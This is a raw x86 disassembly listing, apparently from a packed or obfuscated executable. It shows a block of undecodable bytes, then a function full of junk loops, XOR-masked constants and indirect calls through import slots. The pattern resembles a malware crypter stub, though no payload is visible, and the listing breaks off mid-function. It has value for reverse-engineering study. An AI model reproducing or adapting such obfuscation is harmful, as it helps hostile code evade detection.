  414c77:	dec    esp
  414c78:	scas   al,BYTE PTR es:[edi]
  414c79:	pop    edi
  414c7a:	addr16 jge 0x414c30
  414c7d:	cmp    eax,0x8a410c2a
  414c82:	cdq    
  414c83:	aas    
  414c84:	xchg   ch,ah
  414c86:	or     al,0x69
  414c88:	dec    eax
  414c89:	xchg   ecx,eax
  414c8a:	mov    al,ds:0xf9d0f2c4
  414c8f:	mov    al,0x3c
  414c91:	adc    DWORD PTR [esi-0x80],ecx
  414c94:	and    ah,BYTE PTR [edi+0x67]
  414c97:	fistp  QWORD PTR [ecx]
  414c99:	xchg   ebx,eax
  414c9a:	adc    al,0x69
  414c9c:	jecxz  0x414cce
  414c9e:	dec    ebx
  414c9f:	add    edx,ebp
  414ca1:	lock mov WORD PTR [edi],gs
  414ca4:	clc    
  414ca5:	sub    ecx,ecx
  414ca7:	out    dx,eax
  414ca8:	mov    ch,0x93
  414caa:	cli    
  414cab:	jge    0x414ced
  414cad:	xchg   edi,eax
  414cae:	mov    cl,0x4
  414cb0:	loope  0x414cb4
  414cb2:	stc    
  414cb3:	(bad)  
  414cb4:	push   ebp
  414cb5:	fistp  WORD PTR [ecx-0x5992a791]
  414cbb:	jmp    0x414d3a
  414cbd:	out    dx,eax
  414cbe:	sub    al,BYTE PTR [ebx+0xb]
  414cc1:	jb     0x414d1d
  414cc3:	inc    eax
  414cc4:	(bad)  
  414cc5:	popa   
  414cc6:	out    dx,eax
  414cc7:	daa    
  414cc8:	(bad)  
  414cca:	mov    ecx,0xdee2cfa8
  414ccf:	out    0x10,eax
  414cd1:	mov    ah,0xf8
  414cd3:	and    ch,bh
  414cd5:	or     edi,DWORD PTR [edi-0x435551a8]
  414cdb:	imul   edi,DWORD PTR [ebx],0x941fcf00
  414ce1:	enter  0xa999,0x9d
  414ce5:	pop    ebx
  414ce6:	pop    ds
  414ce7:	sub    al,0x2f
  414ce9:	adc    al,BYTE PTR [edi+0x1]
  414cec:	(bad)  
  414ced:	pushf  
  414cee:	pop    eax
  414cef:	mov    ?,WORD PTR ds:[esi+0x3f]
  414cf3:	sub    DWORD PTR [edi-0xe559b60],edx
  414cf9:	xchg   esp,eax
  414cfa:	inc    ebp
  414cfb:	mov    esi,0x9d1e02ae
  414d00:	loope  0x414c85
  414d02:	sahf   
  414d03:	push   DWORD PTR [ebp+0x73]
  414d06:	in     al,dx
  414d07:	shr    DWORD PTR [esi],0x2b
  414d0a:	pop    edi
  414d0b:	(bad)  
  414d0c:	sub    al,0xf0
  414d0e:	popa   
  414d0f:	mov    DWORD PTR [edi+0x270a9767],ebx
  414d15:	loope  0x414d63
  414d17:	in     eax,dx
  414d18:	test   bh,al
  414d1a:	inc    esp
  414d1b:	(bad)  [edx]
  414d1d:	retf   0xfed3
  414d20:	mov    ah,0x64
  414d22:	pop    ecx
  414d23:	push   ds
  414d24:	xchg   edx,eax
  414d25:	clc    
  414d26:	jbe    0x414ce7
  414d28:	xchg   DWORD PTR [ecx+edi*4+0x6f],ebx
  414d2c:	and    al,0x27
  414d2e:	lods   al,BYTE PTR ds:[esi]
  414d2f:	outs   dx,BYTE PTR ds:[esi]
  414d30:	out    0x38,eax
  414d32:	loope  0x414cd3
  414d34:	mov    DWORD PTR [esi+0x2062e488],ebx
  414d3a:	into   
  414d3b:	xor    eax,0x5e294ea1
  414d40:	pushf  
  414d41:	pop    edx
  414d42:	stos   DWORD PTR es:[edi],eax
  414d43:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414d45:	jp     0x414cf1
  414d47:	outs   dx,BYTE PTR ds:[esi]
  414d48:	adc    edi,DWORD PTR [esi]
  414d4a:	cld    
  414d4b:	rol    DWORD PTR [ebx-0x49],cl
  414d4e:	push   esi
  414d4f:	out    0x47,al
  414d51:	ins    BYTE PTR es:[edi],dx
  414d52:	fmul   st(2),st
  414d54:	xchg   BYTE PTR [edx],al
  414d56:	imul   BYTE PTR [edx]
  414d58:	popa   
  414d59:	shl    BYTE PTR [ebx],1
  414d5b:	aad    0x7a
  414d5d:	jl     0x414dd8
  414d5f:	jo     0x414d0b
  414d61:	ficom  DWORD PTR [esi-0x79]
  414d64:	dec    eax
  414d65:	pop    ecx
  414d66:	iret   
  414d67:	mov    ds:0x46d23185,eax
  414d6c:	repz or esp,0xffffffd3
  414d70:	pop    ss
  414d71:	inc    edi
  414d72:	cwde   
  414d73:	cdq    
  414d74:	inc    ebx
  414d75:	adc    DWORD PTR [edx],0xfffffff9
  414d78:	mov    al,ds:0x23e2b7ae
  414d7d:	adc    BYTE PTR [eax+0xd1c63e4],cl
  414d83:	fidivr WORD PTR [ebx+0x27e0fc36]
  414d89:	aad    0xda
  414d8b:	xchg   edx,eax
  414d8c:	sub    BYTE PTR [ecx-0x45053473],0x59
  414d93:	cdq    
  414d94:	aas    
  414d95:	cmp    BYTE PTR [edi+0x57bd1c8a],bl
  414d9b:	xchg   BYTE PTR [edi+eax*8-0x34c9a79a],cl
  414da2:	lods   al,BYTE PTR ds:[esi]
  414da3:	or     al,0x95
  414da5:	and    bl,0x76
  414da8:	das    
  414da9:	outs   dx,DWORD PTR ds:[esi]
  414daa:	and    ah,ah
  414dac:	test   eax,0x1cb7b60c
  414db1:	push   cs
  414db2:	xor    esi,DWORD PTR ds:0x9d990fe1
  414db8:	and    BYTE PTR [eax+0x7c],0xf7
  414dbc:	lea    ebp,[eax+0x136ae5cf]
  414dc2:	ja     0x414e0b
  414dc4:	mov    ebx,0xb4b35a46
  414dc9:	or     ch,BYTE PTR [eax]
  414dcb:	clc    
  414dcc:	add    BYTE PTR [eax+0x6f],bh
  414dcf:	lea    ebp,[ebx]
  414dd1:	lock lds ebx,FWORD PTR [edi-0x47]
  414dd5:	adc    dl,BYTE PTR [eax]
  414dd7:	(bad)  
  414dd9:	ins    DWORD PTR es:[edi],dx
  414dda:	(bad)  
  414ddb:	mov    dh,0xe4
  414ddd:	push   edi
  414dde:	xor    esi,eax
  414de0:	push   esi
  414de1:	xchg   ebp,eax
  414de2:	inc    edx
  414de3:	or     BYTE PTR [esi-0x76],dh
  414de6:	sub    BYTE PTR [eax+0x5154f512],dl
  414dec:	jae    0x414d78
  414dee:	inc    ebx
  414def:	dec    edx
  414df0:	test   eax,0x7ccf9170
  414df5:	repnz sub al,ah
  414df8:	fst    DWORD PTR [ebx+0x6d893c3c]
  414dfe:	xchg   esp,eax
  414dff:	fst    DWORD PTR [ebx-0x5199a59c]
  414e05:	mov    ds:0xa561695f,eax
  414e0a:	sub    DWORD PTR [edx-0x4a8ac7fd],esi
  414e10:	imul   edx
  414e12:	hlt    
  414e13:	pop    eax
  414e14:	mov    bl,0xe6
  414e16:	popa   
  414e17:	dec    esp
  414e18:	arpl   WORD PTR [edx+0x5b],dx
  414e1b:	add    eax,esi
  414e1d:	jmp    0xb0f38d2e
  414e22:	xchg   ecx,eax
  414e23:	pushf  
  414e24:	jns    0x414ea0
  414e26:	push   edi
  414e27:	jecxz  0x414e38
  414e29:	xchg   BYTE PTR [esi-0x54],ah
  414e2c:	(bad)  
  414e2d:	call   FWORD PTR [ebx+0x5f]
  414e30:	leave  
  414e31:	ret    0x8
  414e34:	push   ebp
  414e35:	mov    ebp,esp
  414e37:	sub    esp,0xa8
  414e3d:	movzx  eax,WORD PTR ds:0x42af75
  414e44:	xor    DWORD PTR ds:0x42aef1,eax
  414e4a:	push   ebx
  414e4b:	and    DWORD PTR ds:0x42af39,0x2f2e
  414e55:	push   esi
  414e56:	and    DWORD PTR ds:0x42afc1,0x0
  414e60:	jmp    0x414e70
  414e65:	mov    eax,ds:0x42afc1
  414e6a:	inc    eax
  414e6b:	mov    ds:0x42afc1,eax
  414e70:	cmp    DWORD PTR ds:0x42afc1,0x10
  414e77:	jae    0x414ea3
  414e7d:	cmp    DWORD PTR ds:0x42afc1,0x12
  414e84:	jne    0x414e9e
  414e8a:	push   DWORD PTR [ebp-0x1c]
  414e8d:	push   DWORD PTR [ebp-0x10]
  414e90:	push   DWORD PTR [ebp-0x10]
  414e93:	push   0x5267
  414e98:	call   DWORD PTR ds:0x41d260
  414e9e:	jmp    0x414e65
  414ea3:	push   edi
  414ea4:	xor    esi,esi
  414ea6:	add    ecx,DWORD PTR ds:0x42afcd
  414eac:	push   0x0
  414eae:	push   0x19
  414eb0:	xor    ecx,eax
  414eb2:	pop    ecx
  414eb3:	or     eax,0x2a9a
  414eb8:	xor    edx,edx
  414eba:	sub    eax,DWORD PTR ds:0x42af81
  414ec0:	mov    eax,esi
  414ec2:	div    ecx
  414ec4:	push   edx
  414ec5:	sbb    DWORD PTR ds:0x42af79,0x42afb1
  414ecf:	call   DWORD PTR ds:0x41d400
  414ed5:	mov    DWORD PTR ds:0x42af81,0x6c20
  414edf:	inc    esi
  414ee0:	mov    DWORD PTR ds:0x42afb5,0x23c0
  414eea:	cmp    esi,0x1000
  414ef0:	jb     0x414ea6
  414ef6:	mov    DWORD PTR [ebp-0x24],0xf89c8538
  414efd:	inc    DWORD PTR ds:0x42aef5
  414f03:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  414f0a:	lea    eax,[ebp-0x2c]
  414f0d:	inc    ecx
  414f0e:	mov    DWORD PTR [ebp-0x18],eax
  414f11:	and    DWORD PTR ds:0x42afc5,0x42aee5
  414f1b:	lea    eax,[ebp-0x30]
  414f1e:	xor    DWORD PTR ds:0x42af31,0x42afc1
  414f28:	mov    DWORD PTR [ebp-0x14],eax
  414f2b:	or     DWORD PTR ds:0x42af81,edi
  414f31:	mov    eax,ds:0x41eae6
  414f36:	add    DWORD PTR ds:0x42aee9,ebx
  414f3c:	mov    eax,DWORD PTR [eax+0x1c8]
  414f42:	mov    eax,DWORD PTR [eax]
  414f44:	and    DWORD PTR ds:0x42af7d,0x0
  414f4e:	jmp    0x414f60
  414f53:	mov    edi,DWORD PTR ds:0x42af7d
  414f59:	inc    edi
  414f5a:	mov    DWORD PTR ds:0x42af7d,edi
  414f60:	cmp    DWORD PTR ds:0x42af7d,0x11
  414f67:	jae    0x414fb6
  414f6d:	cmp    DWORD PTR ds:0x42af7d,0x4
  414f74:	jne    0x414f8d
  414f7a:	push   0x73af
  414f7f:	push   0x42af89
  414f84:	push   DWORD PTR [ebp-0x18]
  414f87:	call   DWORD PTR ds:0x41d264
  414f8d:	cmp    DWORD PTR ds:0x42af7d,0x3
  414f94:	jne    0x414fa7
  414f9a:	mov    edi,DWORD PTR ds:0x42af7d
  414fa0:	inc    edi
  414fa1:	mov    DWORD PTR ds:0x42af7d,edi
  414fa7:	jmp    0x414f53
  414fac:	mov    DWORD PTR ds:0x42af35,0x500e
  414fb6:	mov    ecx,DWORD PTR [ebp-0x14]
  414fb9:	and    DWORD PTR ds:0x42af49,0x1370
  414fc3:	mov    esi,0x7510850
  414fc8:	xor    ebx,DWORD PTR ds:0x42aeed
  414fce:	xor    eax,esi
  414fd0:	xor    edi,edi
  414fd2:	mov    edi,0x327298
  414fd7:	sub    DWORD PTR ds:0x42afc5,ebx
  414fdd:	add    eax,edi
  414fdf:	mov    DWORD PTR [ecx],eax
  414fe1:	mov    DWORD PTR ds:0x42afc9,edi
  414fe7:	mov    eax,ds:0x41ed1a
  414fec:	movzx  ebx,BYTE PTR ds:0x42af39
  414ff3:	cmp    eax,0x22c02f45
  414ff8:	mov    eax,DWORD PTR [ebp-0x4]
  414ffb:	mov    DWORD PTR ds:0x42af85,edi
  415001:	mov    ebx,0xf89c853c
  415006:	mov    DWORD PTR ds:0x42afc5,0x1488
  415010:	je     0x4150a4
  415016:	and    DWORD PTR ds:0x42afc9,0x0
  415020:	jmp    0x415032
  415025:	mov    ecx,DWORD PTR ds:0x42afc9
  41502b:	inc    ecx
  41502c:	mov    DWORD PTR ds:0x42afc9,ecx
  415032:	cmp    DWORD PTR ds:0x42afc9,0x13
  415039:	jae    0x41506a
  41503f:	cmp    DWORD PTR ds:0x42afc9,0x15
  415046:	jne    0x41505f
  41504c:	push   DWORD PTR [ebp-0xc]
  41504f:	push   0x7b08
  415054:	push   0x10eb
  415059:	call   DWORD PTR ds:0x41d268
  41505f:	jmp    0x415025
  415064:	or     ecx,DWORD PTR ds:0x42aff1
  41506a:	mov    ecx,DWORD PTR [ebp-0x24]
  41506d:	xor    eax,esi
  41506f:	xor    DWORD PTR ds:0x42af71,0x57fa
  415079:	add    eax,edi
  41507b:	add    DWORD PTR ds:0x42b005,0x42af35
  415085:	imul   eax,ecx
  415088:	mov    DWORD PTR ds:0x42af41,0x7c29
  415092:	mov    DWORD PTR [ebp-0x24],eax
  415095:	mov    DWORD PTR ds:0x42af45,0x1f8
  41509f:	jmp    0x4152c1
  4150a4:	and    DWORD PTR ds:0x42aff9,0x0
  4150ae:	mov    ecx,DWORD PTR ds:0x42aff9
  4150b4:	inc    ecx
  4150b5:	mov    DWORD PTR ds:0x42aff9,ecx
  4150bb:	cmp    DWORD PTR ds:0x42aff9,0x2a
  4150c2:	jne    0x4150d1
  4150c8:	push   DWORD PTR [ebp-0x24]
  4150cb:	call   DWORD PTR ds:0x41d26c
  4150d1:	cmp    DWORD PTR ds:0x42aff9,0x1c
  4150d8:	jb     0x4150ae
  4150de:	movzx  ecx,BYTE PTR ds:0x42afbd
  4150e5:	xor    ecx,DWORD PTR ds:0x42afcd
  4150eb:	mov    DWORD PTR ds:0x42afbd,ecx
  4150f1:	xor    eax,esi
  4150f3:	add    eax,edi
  4150f5:	and    DWORD PTR ds:0x42af31,edi
  4150fb:	mov    ds:0x41ebfa,eax
  415100:	neg    DWORD PTR ds:0x42af71
  415106:	mov    eax,DWORD PTR [ebp-0x24]
  415109:	and    DWORD PTR ds:0x42aff5,0x0
  415113:	mov    ecx,DWORD PTR ds:0x42aff5
  415119:	inc    ecx
  41511a:	mov    DWORD PTR ds:0x42aff5,ecx
  415120:	cmp    DWORD PTR ds:0x42aff5,0x29
  415127:	jne    0x415138
  41512d:	push   0x548b
  415132:	call   DWORD PTR ds:0x41d0e4
  415138:	cmp    DWORD PTR ds:0x42aff5,0x1c
  41513f:	jb     0x415113
  415145:	and    DWORD PTR ds:0x42aedd,0x0
  41514f:	xor    ecx,ecx
  415151:	add    ecx,DWORD PTR ds:0x42aedd
  415157:	inc    ecx
  415158:	mov    DWORD PTR ds:0x42aedd,ecx
  41515e:	cmp    DWORD PTR ds:0x42aedd,0xe
  415165:	jne    0x415176
  41516b:	push   0x42b11f
  415170:	call   DWORD PTR ds:0x41d0e8
  415176:	cmp    DWORD PTR ds:0x42aedd,0xd
  41517d:	jne    0x415190
  415183:	mov    ecx,DWORD PTR ds:0x42aedd
  415189:	inc    ecx
  41518a:	mov    DWORD PTR ds:0x42aedd,ecx
  415190:	cmp    DWORD PTR ds:0x42aedd,0x17
  415197:	jb     0x41514f
  41519d:	or     ecx,DWORD PTR ds:0x42af01
  4151a3:	xor    eax,esi
  4151a5:	and    DWORD PTR ds:0x42af41,0x0
  4151af:	jmp    0x4151c1
  4151b4:	mov    ecx,DWORD PTR ds:0x42af41
  4151ba:	inc    ecx
  4151bb:	mov    DWORD PTR ds:0x42af41,ecx
  4151c1:	cmp    DWORD PTR ds:0x42af41,0x11
  4151c8:	jae    0x415217
  4151ce:	cmp    DWORD PTR ds:0x42af41,0x9
  4151d5:	jne    0x4151f4
  4151db:	push   0x577c
  4151e0:	push   DWORD PTR [ebp-0x18]
  4151e3:	push   0x838a
  4151e8:	push   DWORD PTR [ebp-0x10]
  4151eb:	push   DWORD PTR [ebp-0x28]
  4151ee:	call   DWORD PTR ds:0x41d0ec
  4151f4:	cmp    DWORD PTR ds:0x42af41,0x8
  4151fb:	jne    0x415210
  415201:	xor    ecx,ecx
  415203:	xor    ecx,DWORD PTR ds:0x42af41
  415209:	inc    ecx
  41520a:	mov    DWORD PTR ds:0x42af41,ecx
  415210:	jmp    0x4151b4
  415215:	not    ecx
  415217:	add    eax,edi
  415219:	and    DWORD PTR ds:0x42af49,0x0
  415223:	mov    ecx,DWORD PTR ds:0x42af49
  415229:	inc    ecx
  41522a:	mov    DWORD PTR ds:0x42af49,ecx
  415230:	cmp    DWORD PTR ds:0x42af49,0x26
  415237:	jne    0x41524b
  41523d:	push   DWORD PTR [ebp-0x20]
  415240:	push   0x2236
  415245:	call   DWORD PTR ds:0x41d270
  41524b:	cmp    DWORD PTR ds:0x42af49,0x16
  415252:	jb     0x415223
  415258:	mov    ds:0x41ed1a,eax
  41525d:	add    ecx,DWORD PTR ds:0x42aef5
  415263:	mov    eax,DWORD PTR [ebp-0x4]
  415266:	mov    ecx,DWORD PTR ds:0x41ebfa
  41526c:	xor    eax,esi
  41526e:	xor    DWORD PTR ds:0x42af49,0x42b001
  415278:	add    eax,edi
  41527a:	mov    DWORD PTR ds:0x42aff1,0x2781
  415284:	cmp    ecx,eax
  415286:	mov    DWORD PTR ds:0x42afc1,0x2b32
  415290:	jne    0x4152c1
  415296:	mov    DWORD PTR ds:0x42afb9,0x7717
  4152a0:	push   ebx
  4152a1:	sub    DWORD PTR ds:0x42aee5,0x42affd
  4152ab:	push   DWORD PTR [ebp-0x4]
  4152ae:	push   DWORD PTR [ebp-0x24]
  4152b1:	sub    DWORD PTR ds:0x42afbd,0x42aed9
  4152bb:	call   DWORD PTR ds:0x41ebf2
  4152c1:	mov    eax,ds:0x41eae6
  4152c6:	mov    eax,DWORD PTR [eax+0x18c]
  4152cc:	mov    eax,DWORD PTR [eax]
  4152ce:	mov    DWORD PTR [ebp-0x44],eax
  4152d1:	mov    DWORD PTR [ebp-0x10],ebx
  4152d4:	and    DWORD PTR ds:0x42af4d,0x0
  4152de:	jmp    0x4152f0
  4152e3:	mov    ecx,DWORD PTR ds:0x42af4d
  4152e9:	inc    ecx
  4152ea:	mov    DWORD PTR ds:0x42af4d,ecx
  4152f0:	cmp    DWORD PTR ds:0x42af4d,0x1a
  4152f7:	jae    0x4153d6
  4152fd:	cmp    DWORD PTR ds:0x42af4d,0x24
  415304:	jne    0x41531a
  41530a:	push   0x42afc9
  41530f:	push   0x28eb
  415314:	call   DWORD PTR ds:0x41d0f0
  41531a:	jmp    0x4152e3
  41531f:	mov    DWORD PTR ds:0x42af01,0x10
  415329:	cmp    DWORD PTR ds:0x42af01,0x0
  415330:	je     0x4153d6
  415336:	cmp    DWORD PTR ds:0x42af01,0x7
  41533d:	jne    0x415351
  415343:	push   0x572d
  415348:	push   DWORD PTR [ebp-0xc]
  41534b:	call   DWORD PTR ds:0x41d0f4
  415351:	cmp    DWORD PTR ds:0x42af01,0x8
  415358:	jne    0x41536d
  41535e:	xor    edx,edx
  415360:	add    edx,DWORD PTR ds:0x42af01
  415366:	dec    edx
  415367:	mov    DWORD PTR ds:0x42af01,edx
  41536d:	mov    edx,DWORD PTR ds:0x42af01
  415373:	dec    edx
  415374:	mov    DWORD PTR ds:0x42af01,edx
  41537a:	jmp    0x415329
  41537f:	and    DWORD PTR ds:0x42af71,0x0
  415389:	jmp    0x415399
  41538e:	mov    eax,ds:0x42af71
  415393:	inc    eax
  415394:	mov    ds:0x42af71,eax
  415399:	cmp    DWORD PTR ds:0x42af71,0x13
  4153a0:	jae    0x4153d6
  4153a6:	cmp    DWORD PTR ds:0x42af71,0x1b
  4153ad:	jne    0x4153cb
  4153b3:	push   0x3cd6
  4153b8:	push   0x42aed9
  4153bd:	push   DWORD PTR [ebp-0x1c]
  4153c0:	push   0x865d
  4153c5:	call   DWORD PTR ds:0x41d0f8
  4153cb:	jmp    0x41538e
  4153d0:	or     DWORD PTR ds:0x42af3d,ecx
  4153d6:	mov    DWORD PTR [ebp-0x10],ebx
  4153d9:	mov    DWORD PTR [ebp-0x10],ebx
  4153dc:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  4153e3:	and    DWORD PTR ds:0x42afb1,0x0
  4153ed:	mov    eax,ds:0x42afb1
  4153f2:	inc    eax
  4153f3:	mov    ds:0x42afb1,eax
  4153f8:	cmp    DWORD PTR ds:0x42afb1,0xc
  4153ff:	jne    0x415416
  415405:	push   DWORD PTR [ebp-0x24]
  415408:	push   DWORD PTR [ebp-0x24]
  41540b:	push   0x42b0b2
  415410:	call   DWORD PTR ds:0x41d0fc
  415416:	cmp    DWORD PTR ds:0x42afb1,0xb
  41541d:	jne    0x415431
  415423:	xor    eax,eax
  415425:	xor    eax,DWORD PTR ds:0x42afb1
  41542b:	inc    eax
  41542c:	mov    ds:0x42afb1,eax
  415431:	cmp    DWORD PTR ds:0x42afb1,0x17
  415438:	jb     0x4153ed
  41543e:	adc    DWORD PTR ds:0x42aee1,ecx
  415444:	mov    DWORD PTR [ebp-0x10],ebx
  415447:	mov    DWORD PTR [ebp-0x10],0xf89c8520
  41544e:	and    ecx,eax
  415450:	mov    eax,DWORD PTR [ebp-0x24]
  415453:	mov    DWORD PTR ds:0x42b00d,0x1d
  41545d:	cmp    DWORD PTR ds:0x42b00d,0x0
  415464:	je     0x4154d3
  41546a:	cmp    DWORD PTR ds:0x42b00d,0xe
  415471:	jne    0x415495
  415477:	push   DWORD PTR [ebp-0x1c]
  41547a:	push   0x42aee9
  41547f:	push   DWORD PTR [ebp-0x14]
  415482:	push   0x4571
  415487:	push   0x5504
  41548c:	push   DWORD PTR [ebp-0x24]
  41548f:	call   DWORD PTR ds:0x41d100
  415495:	cmp    DWORD PTR ds:0x42b00d,0xf
  41549c:	jne    0x4154af
  4154a2:	mov    edx,DWORD PTR ds:0x42b00d
  4154a8:	dec    edx
  4154a9:	mov    DWORD PTR ds:0x42b00d,edx
  4154af:	mov    edx,DWORD PTR ds:0x42b00d
  4154b5:	dec    edx
  4154b6:	mov    DWORD PTR ds:0x42b00d,edx
  4154bc:	jmp    0x41545d
  4154c1:	mov    edx,DWORD PTR ds:0x42af39
  4154c7:	and    edx,DWORD PTR ds:0x42afcd
  4154cd:	mov    DWORD PTR ds:0x42af39,edx
  4154d3:	mov    ecx,DWORD PTR [ebp-0x4]
  4154d6:	and    DWORD PTR ds:0x42af01,0x65ac
  4154e0:	mov    edx,DWORD PTR [ebp-0x4]
  4154e3:	add    DWORD PTR ds:0x42afb5,0x42af71
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42afb5,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42af45,0x42af85
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42af75,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42aee1,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42af3d,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42af3d
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42af3d,ecx
  415552:	cmp    DWORD PTR ds:0x42af3d,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42afc5
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42af3d,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42affd,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42affd
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42affd,ecx
  4155a7:	cmp    DWORD PTR ds:0x42affd,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42affd,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
